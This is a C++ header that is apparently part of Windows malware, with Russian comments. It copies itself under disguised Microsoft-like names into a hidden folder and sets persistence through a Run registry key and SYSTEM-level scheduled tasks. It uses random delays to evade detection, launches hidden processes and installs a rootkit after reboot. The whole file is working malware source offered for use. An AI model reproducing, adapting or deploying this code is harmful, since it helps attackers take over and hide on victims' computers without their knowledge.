#pragma once
#include <iostream>
#include <Windows.h>   
#include <Shlobj.h>    
#include <string>
#include <filesystem>  
#include <fstream>
#include "settings.h"
#include <thread> 
#include <chrono>
#include "rootkit.h"

std::string sText;
int iCryptoFormat;

// Добавление в автозагрузку
void __startup() {
    WCHAR currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    
    // Добавляем в реестр (основной метод)
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        std::wstring regValue = L"\"";
        regValue += currentPath;
        regValue += L"\" --installed";
        
        RegSetValueExW(hKey, L"WindowsSecurityService",
            0, REG_SZ,
            (BYTE*)regValue.c_str(),
            (regValue.length() + 1) * sizeof(wchar_t));
        
        RegCloseKey(hKey);
    }

    // Создаем задачу в планировщике (резервный метод)
    std::wstring command = L"schtasks /create /tn \"Windows Security Service\" /tr \"\\\"";
    command += currentPath;
    command += L"\\\" --installed\" /sc onlogon /ru SYSTEM /rl HIGHEST /f";

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;

    if (CreateProcessW(NULL, (LPWSTR)command.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Проверка первого запуска после перезагрузки
bool __check_first_run() {
    HKEY hKey;
    DWORD value = 0;
    DWORD size = sizeof(DWORD);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        bool exists = RegQueryValueExW(hKey, L"$77FirstRun", 0, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS;
        RegCloseKey(hKey);
        return !exists;
    }
    return true;
}

// Установка файлов без активации
void __install() {
    if (__check_first_run()) {
        // Добавляем случайную задержку при первом запуске
        Sleep(random(30000, 60000));  // Задержка 30-60 секунд
        
        WCHAR currentPath[MAX_PATH];
        WCHAR targetPath[MAX_PATH];
        
        GetModuleFileNameW(NULL, currentPath, MAX_PATH);
        
        WCHAR localAppData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
            // Генерируем случайное имя папки и файла
            std::string randomFolder = "Microsoft" + std::to_string(random(1000, 9999)) + "Helper";
            std::string randomFile = "WinSecurityService" + std::to_string(random(1000, 9999)) + ".exe";
            
            std::wstring installFolder = std::wstring(localAppData) + L"\\" + 
                                       std::wstring(randomFolder.begin(), randomFolder.end()) + L"\\";
            
            CreateDirectoryW(installFolder.c_str(), NULL);
            
            std::wstring fullTargetPath = installFolder + 
                                        std::wstring(randomFile.begin(), randomFile.end());
            
            if (std::wstring(currentPath).find(installFolder) == std::string::npos) {
                // Копируем файл с новым именем
                CopyFileW(currentPath, fullTargetPath.c_str(), FALSE);
                
                // Устанавливаем атрибуты файла
                SetFileAttributesW(fullTargetPath.c_str(), 
                    FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
                
                // Создаем задачу в планировщике вместо записи в реестр
                std::wstring taskName = L"Windows" + std::to_wstring(random(1000, 9999)) + L"Update";
                std::wstring command = L"schtasks /create /tn \"" + taskName + 
                    L"\" /tr \"" + fullTargetPath + 
                    L"\" /sc onlogon /rl highest /f /delay 0003:00";
                
                // Запускаем команду скрыто
                STARTUPINFOW si = { sizeof(si) };
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                PROCESS_INFORMATION pi;
                
                CreateProcessW(NULL, (LPWSTR)command.c_str(), NULL, NULL, FALSE,
                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                
                // Ждем некоторое время перед запуском основного функционала
                Sleep(random(10000, 20000));
                
                // Запускаем копию и завершаем текущий процесс
                ShellExecuteW(NULL, L"open", fullTargetPath.c_str(), NULL, NULL, SW_HIDE);
                ExitProcess(0);
            }
        }
    }
}

// Установка rootkit только после перезагрузки
void __rootkit() {
    if (!__check_first_run()) {
        static rootkit::Rootkit rt;
        rt.Install();
    }
}